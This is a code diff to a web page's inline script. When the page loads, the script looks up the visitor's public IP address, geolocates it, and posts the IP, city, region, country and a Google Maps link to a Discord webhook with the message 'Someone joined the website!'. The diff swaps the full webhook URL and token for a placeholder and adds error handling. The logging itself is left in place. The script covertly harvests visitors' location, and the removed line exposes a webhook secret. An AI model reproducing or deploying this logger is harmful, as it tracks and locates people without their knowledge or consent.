@@ -21,7 +21,7 @@
             const googleMapsUrl = `https://www.google.com/maps/search/?api=1&query=${ipInfo.lat},${ipInfo.lon}`;
             const content = `Someone joined the website!\nIP Address: ${ipInfo.query}\nLocation: ${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}\nGoogle Maps: ${googleMapsUrl}`;
 
-            fetch('https://discord.com/api/webhooks/1277136397463191647/PM6p1XECMViN_okQNYIAZjLWoduKF9vN26vq3F80hx8lUg1KJaaMiBj6SPIn4u_vRGqy', {
+            fetch('webhooks', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -37,9 +37,13 @@
         }
 
         window.addEventListener('load', async () => {
-            const ip = await getPublicIP();
-            const ipInfo = await geolocateIP(ip);
-            sendWebhook(ipInfo);
+            try {
+                const ip = await getPublicIP();
+                const ipInfo = await geolocateIP(ip);
+                await sendWebhook(ipInfo);
+            } catch (error) {
+                console.error('Error:', error);
+            }
         });
     </script>
 </head>
